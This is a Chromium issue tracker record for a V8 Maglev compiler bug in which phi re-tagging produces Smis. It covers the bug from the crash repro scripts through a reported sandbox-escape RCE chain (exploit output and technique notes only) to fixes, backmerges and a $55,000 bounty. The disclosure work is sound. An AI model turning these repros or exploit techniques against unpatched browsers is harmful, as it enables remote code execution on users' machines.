# Incorrect Maglev assumption leading to SIGSEGV 

| Field | Value |
|-------|-------|
| **Issue ID** | [486657483](https://issues.chromium.org/issues/486657483) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | er...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2026-02-23 |
| **Bounty** | $55,000.00 |

## Description

##### VERSION

V8 Git Commit: c0a41078e69f23668c8d34c61f286a1b5b211f19

##### REPRODUCTION CASE

```
function make_heapnum(v) { const a=[1.1]; a[0]=v; return a[0]; }

const H0 = make_heapnum(-1.0);
const H1 = make_heapnum(-1.0);

function f(c, target) {
  let v = c ? H0 : H1;
  let y = v + 0.1;
  target.p = v;

  return y;
}

%PrepareFunctionForOptimization(f);

let target = {p:{x:1}};
f(0, target);

%OptimizeMaglevOnNextCall(f);
gc();

(f(1, target));

```

`d8 --allow-natives-syntax --expose-gc x.js`

stack trace:

```
Received signal 11 SEGV_ACCERR 7ea2fffc0000

==== C stack trace ===============================

out/fuzzbuild/d8(___interceptor_backtrace+0x46)[0x5ab1acf4fb36]
out/fuzzbuild/d8(+0x185b67f)[0x5ab1ad3fb67f]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x70ee6b645330]
[0x5ab1e00002f2]
[end of stack trace]
Segmentation fault

```
##### BISECT

```
commit 0111c795359d675cfa6522637b6a3a23a0c5f0ce
Author: Darius Mercadier <dmercadier@chromium.org>
Date:   Fri Sep 26 16:00:48 2025 +0200

    [turbolev] Less expensive WB for non-smis
    
    Bug: 431933185
    Change-Id: Ic26217550159c5168353d85ab42806733bb5037c
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6988732
    Reviewed-by: Victor Gomes <victorgomes@chromium.org>
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org>
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#102798}

```
##### VULNERABILITY DETAILS

In the repro, at graph-build time the store input is inferred as `HeapNumber`, therefore `NodeTypeCanBe(..., kSmi)` returns false, and `value_can_be_smi=false` is set.

After graph building, `MaglevPhiRepresentationSelector` runs and:

- It untags the phi to Float64
- Then re-tags it for the store using `Float64ToTagged(kCanonicalizeSmi)`
  - src/maglev/maglev-phi-representation-selector.cc:1355

That re-tagging can produce a Smi for integral floats inside the Smi range, which invalides the `value_can_be_smi=false` assumption which leads to a crash inside the optimized WB code for non-smi.

##### CREDIT INFORMATION

Reporter credit: Erge

## Attachments

- [x.js](attachments/x.js) (text/javascript, 355 B)
- [repro_loop.js](attachments/repro_loop.js) (text/javascript, 336 B)
- [x.js](attachments/x.js) (text/javascript, 1.8 KB)
- [m145_rce.js](attachments/m145_rce.js) (text/javascript, 8.3 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6455161782206464.

### an...@chromium.org (2026-02-23)

Clusterfuzz is I think incorrectly treating this as a duplicate of <https://issues.chromium.org/issues/435589244> (see comments in this bug). Forwarding to V8 shepherd to PTAL; setting provisional severity and foundin for now.

### ch...@google.com (2026-02-24)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### er...@gmail.com (2026-02-24)

After further analysis the root cause seems to expand beyond the optimized WB path, similar to the previous repro in this one we invalidate the `check_type == kOmitHeapObjectCheck` assumption by phi re-tagging inside the loop, due to the stale assumption no `HeapObjectCheck` will be emitted and the `ToBoolean` codegen (which assumes an heap obj) will crash with our Smi.

It's also worth noting that this repro bisects to the commit only due to the specific phi re-tagging pattern used.

I also have doubts about the exploitability of this issue, as we're limited by the Smi range and can't address anything useful, but I'd love to be proven wrong :)

##### REPRODUCTION CASE

```
function make_heapnum(v) { const a=[1.1]; a[0]=v; return a[0]; }

const H0 = make_heapnum(24440.0);
const H1 = make_heapnum(-1.0);

function f() {
  let x = H0;
  for (let i = 0; i < 1; ++i) {
    if (i) x = H1;
    x + 0.25;
  }
  let c = !x; 

  return c;
}

%PrepareFunctionForOptimization(f);
f();
%OptimizeMaglevOnNextCall(f);
f();

```

`d8 --allow-natives-syntax repro_loop.js`

stack trace:

```
Received signal 11 SEGV_MAPERR 00000000beef

==== C stack trace ===============================

out/fuzzbuild/d8(___interceptor_backtrace+0x46)[0x59034cae5b36]
out/fuzzbuild/d8(+0x185b67f)[0x59034cf9167f]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x7501ccc45330]
[0x5903b2c00185]
[end of stack trace]
Segmentation fault

```
##### Bisect

```
commit a44a16f55c410fd37a39dde32a3d6ce36664810d
Author: Olivier Flückiger <olivf@chromium.org>
Date:   Tue Jul 30 09:59:12 2024 +0200

    [maglev] Enable loop SPeeling
    
    Bug: 350764035
    Change-Id: Iab0ea608b9a997d3ab1e11cae9ca0717bca622e9
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5743764
    Auto-Submit: Olivier Flückiger <olivf@chromium.org>
    Reviewed-by: Victor Gomes <victorgomes@chromium.org>
    Commit-Queue: Olivier Flückiger <olivf@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#95405}

```

### ch...@google.com (2026-02-24)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-24)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### dx...@google.com (2026-02-25)

Project: v8/v8  

Branch:  main  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7604253>

[maglev] Preserve HeapObjectness during Phi untagging when required

---


Expand for full commit details
```
     
    Fixed: 486657483 
    Change-Id: I351d6049a0cdfe82787b644d03c9ae0bcf802b11 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7604253 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105439}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- M `src/maglev/maglev-graph-builder.h`
- M `src/maglev/maglev-graph-optimizer.cc`
- M `src/maglev/maglev-inlining.cc`
- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-ir.cc`
- M `src/maglev/maglev-ir.h`
- M `src/maglev/maglev-phi-representation-selector.cc`
- M `src/maglev/maglev-phi-representation-selector.h`
- M `src/maglev/maglev-reducer-inl.h`
- M `src/maglev/maglev-reducer.h`
- A `test/mjsunit/maglev/regress-486657483-1.js`
- A `test/mjsunit/maglev/regress-486657483-2.js`
- A `test/mjsunit/maglev/regress-486657483-3.js`
- A `test/mjsunit/maglev/regress-486657483-4.js`
- A `test/mjsunit/maglev/regress-486657483-5.js`

---

Hash: [473f72163411778d823846596837bf6ff5af5a5e](https://chromiumdash.appspot.com/commit/473f72163411778d823846596837bf6ff5af5a5e)  

Date: Tue Feb 24 15:54:54 2026


---

### dm...@chromium.org (2026-02-25)

Thanks for the report, and good catch!

So this actually looks like a vulnerability because this bug can lead to storing Smis into HeapObject fields, which in turn can lead to in-sandbox OOB reads/writes. See here for a repro: <https://chromium-review.googlesource.com/c/v8/v8/+/7604253/2/test/mjsunit/maglev/regress-486657483-4.js> (this crashes with --verify-heap because we end up precisely with a Smi in a HeapObject field).

I'm guessing that this bug has been in the code base for years now (so impact=extended).

### ch...@google.com (2026-02-25)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### dm...@chromium.org (2026-02-25)

[Comment #10](https://issues.chromium.org/issues/486657483#comment10): this was *very obviously* fixed by <https://chromium-review.googlesource.com/7604253>, cf [Comment #8](https://issues.chromium.org/issues/486657483#comment8).

### ml...@google.com (2026-02-25)

After offline discussion: This seems to be broken since Maglev inception in M117.

### er...@gmail.com (2026-02-26)

> So this actually looks like a vulnerability because this bug can lead to storing Smis into HeapObject fields, which in turn can lead to in-sandbox OOB reads/writes.

This is indeed the case, attached is a sample exploit which gains arb r/w inside the v8 heap.

```
$ /home/erge/v8/v8/out/x64.release/d8 --allow-natives-syntax x.js
Read from 0x38c0050: fff7fffffff7ffff
Before spray[7]:  fff6fffffff6ffff
After spray[7]:  deadbeefdeadbeef
Received signal 11 SEGV_ACCERR 2f4241414141

==== C stack trace ===============================

/home/erge/v8/v8/out/x64.release/d8(_ZN2v84base5debug10StackTraceC2Ev+0x1e)[0x5ed72156984e]
/home/erge/v8/v8/out/x64.release/d8(+0x304879f)[0x5ed72156979f]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x781ba7a45330]
[0x5ed7813405b0]
[end of stack trace]

```

### dm...@chromium.org (2026-02-26)

Note to self: need to port the fix to Turbolev (not creating a separate bug for this since there won't be any need to backmerge and Turbolev is still disabled by default).

### 24...@project.gserviceaccount.com (2026-02-26)

ClusterFuzz testcase 6455161782206464 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=105438:105439

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### ch...@google.com (2026-02-26)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: M144 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M145 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M146 has already been cut for stable release.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### er...@gmail.com (2026-02-28)

Additionally, I chained this issue with the one fixed in <https://github.com/v8/v8/commit/54cf5fa964f0734a8277ea2837aa2e4168e3240a> to escape the v8 sbx and achieve RCE.

##### Tested on commit `fffd2bdc35a900b4312833885d9d30803580670e` which is the one used by Chromium `145.0.7632.45`

##### `args.gn`:

```
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = true
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_verify_heap = true
dcheck_always_on = false

```
##### Repro

```
$ out/x64.release/d8 --expose-externalize-string m145_rce.js 
Read from 0x38c0050: fff7ffff
Before spray[7]:  7ff8000000000000
After spray[7]:  ffffffffdeadbeef
Leaked value: deadbeef
After write: 41414141
Sandbox primitives ready, starting sbx escape...
Leaked RWX address: 0x3386b2c55a5e
Shell?
$ whoami
erge
$

```

The reasons for `--expose-externalize-string` are the following:

- Introduce an external string inside the V8 heap which we can use for OOB read on the PartionAlloc heap by corrupting its length, this can be easily reproduced in a real chrome build by for example using DOM elements.
- Have an "easy" way to spray the UAF-ed `StackMemory` object with user-controlled data with `externalizeString()`.

I'm still working on reliably spraying the UAF-ed object on a real chrome build as the allocator behaves differently than in D8 and I don't have much experience with it.

Once I have a reliable exploit I'd like to target M145 on <https://github.com/google/security-research/tree/master/v8ctf> with it

### er...@gmail.com (2026-03-01)

> Once I have a reliable exploit I'd like to target M145 on <https://github.com/google/security-research/tree/master/v8ctf> with it

Can confirm RCE on `145.0.7632.45` :)

V8ctf issue: <https://issuetracker.google.com/issues/488743427>

### dr...@chromium.org (2026-03-03)

No crashes seen on Canary. Approving merge to M146. We're not doing any more M144 or M145 releases, so no point in merging there.

### dm...@chromium.org (2026-03-05)

The CL doesn't apply cleanly on M146 and I'd need to backmerge <https://crrev.com/c/7604172> first. Is that ok? It should be low-risk: this other CL is just a refactoring. And I think that it should be safer to backmerge this other CL first than to manually fix the merge conflicts (and risk introducing bugs while doing so).

### dr...@chromium.org (2026-03-05)

Definitely better to merge more tested code than to land untested code.

Approved to merge both <https://crrev.com/c/7604172> and <https://crrev.com/c/7604253>

### dx...@google.com (2026-03-06)

Project: v8/v8  

Branch:  refs/branch-heads/14.6  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7633113>

Merged: [maglev] Default printing in PrintParams based on options()

---


Expand for full commit details
```
     
    Bug: 486657483 
    (cherry picked from commit a96a392ac3eba56779e4e0a848d4c7fd33bb27c3) 
     
    Change-Id: I395df872e63da0968e12075c85041c63f3ae516b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7633113 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.6@{#27} 
    Cr-Branched-From: e04c3a1a2543bdbee7beac8846c9cbe8f657636f-refs/heads/14.6.202@{#1} 
    Cr-Branched-From: 3b0b01e6594ec362369dc16f069012a81748c8ba-refs/heads/main@{#105132}

```

---

Files:

- M `src/codegen/bailout-reason.h`
- M `src/common/globals.h`
- M `src/compiler/turboshaft/operations.cc`
- M `src/compiler/turboshaft/operations.h`
- M `src/compiler/turboshaft/turbolev-graph-builder.cc`
- M `src/interpreter/bytecode-flags-and-tokens.cc`
- M `src/interpreter/bytecode-flags-and-tokens.h`
- M `src/maglev/maglev-graph-builder.cc`
- M `src/maglev/maglev-inlining.cc`
- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-ir.cc`
- M `src/maglev/maglev-ir.h`
- M `src/maglev/maglev-phi-representation-selector.cc`
- M `src/maglev/maglev-reducer-inl.h`

---

Hash: [efcfa7f6b7cff57c48da0f205167bf10f60f12c8](https://chromiumdash.appspot.com/commit/efcfa7f6b7cff57c48da0f205167bf10f60f12c8)  

Date: Tue Feb 24 15:25:33 2026


---

### pe...@google.com (2026-03-06)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2026-03-06)

Project: v8/v8  

Branch:  main  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7628795>

[turbolev] Preserve NumberConversionMode in Int32ToNumber

---


Expand for full commit details
```
     
    Bug: 486657483 
    Change-Id: I564d709a3e5afa81274f96e49bcb54ee33438f04 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7628795 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105634}

```

---

Files:

- M `src/compiler/turboshaft/assembler.h`
- M `src/compiler/turboshaft/turbolev-graph-builder.cc`

---

Hash: [bf136adcbb927aeec4548865c600d5498932e979](https://chromiumdash.appspot.com/commit/bf136adcbb927aeec4548865c600d5498932e979)  

Date: Tue Mar 3 14:54:55 2026


---

### dx...@google.com (2026-03-06)

Project: v8/v8  

Branch:  refs/branch-heads/14.6  

Author:  Darius Mercadier [dmercadier@chromium.org](mailto:dmercadier@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7642893>

Merged: [maglev] Preserve HeapObjectness during Phi untagging when required

---


Expand for full commit details
```
     
    Bug: 486657483 
    (cherry picked from commit 473f72163411778d823846596837bf6ff5af5a5e) 
     
    Change-Id: I2eac220e5a052e359085ea1aa9f60d3a36fa298a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7642893 
    Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
    Auto-Submit: Darius Mercadier <dmercadier@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.6@{#35} 
    Cr-Branched-From: e04c3a1a2543bdbee7beac8846c9cbe8f657636f-refs/heads/14.6.202@{#1} 
    Cr-Branched-From: 3b0b01e6594ec362369dc16f069012a81748c8ba-refs/heads/main@{#105132}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- M `src/maglev/maglev-graph-builder.h`
- M `src/maglev/maglev-graph-optimizer.cc`
- M `src/maglev/maglev-inlining.cc`
- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-ir.cc`
- M `src/maglev/maglev-ir.h`
- M `src/maglev/maglev-phi-representation-selector.cc`
- M `src/maglev/maglev-phi-representation-selector.h`
- M `src/maglev/maglev-reducer-inl.h`
- M `src/maglev/maglev-reducer.h`
- A `test/mjsunit/maglev/regress-486657483-1.js`
- A `test/mjsunit/maglev/regress-486657483-2.js`
- A `test/mjsunit/maglev/regress-486657483-3.js`
- A `test/mjsunit/maglev/regress-486657483-4.js`
- A `test/mjsunit/maglev/regress-486657483-5.js`

---

Hash: [8dc390fd703a5bed7d7edb588f4e3a64ef97fc66](https://chromiumdash.appspot.com/commit/8dc390fd703a5bed7d7edb588f4e3a64ef97fc66)  

Date: Tue Feb 24 15:54:54 2026


---

### er...@gmail.com (2026-03-09)

> Reporter credit: Erge

If possible I'd like to update the reporter credits to "Alessio Ghidini (@Erge)", thank you.

### qk...@google.com (2026-03-10)

Added `LTS-NotApplicable-138` label, M138 has the suspected CL[1] mentioned in the comment #5. But there were many conflicts when trying to merge the fix[1] into M138 codebase. So, it not safe to merge back the fix to M138.

[1] https://chromium-review.git.corp.google.com/c/v8/v8/+/5743764

### sp...@google.com (2026-03-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
High Quality with Functional Exploit. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### qk...@google.com (2026-05-29)

Added `LTS-NotApplicable-144` label, M144 has the suspected CL[1] mentioned in the [comment #5](https://issues.chromium.org/issues/486657483#comment5). But the fix required a dependant CL[2] that caused many conflicts. Thus, it's safer not to merge the fixes to M144.

[1] <https://chromium-review.git.corp.google.com/c/v8/v8/+/5743764>
[2] <https://chromium-review.git.corp.google.com/c/v8/v8/+/7604172>

### ch...@google.com (2026-06-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486657483)*
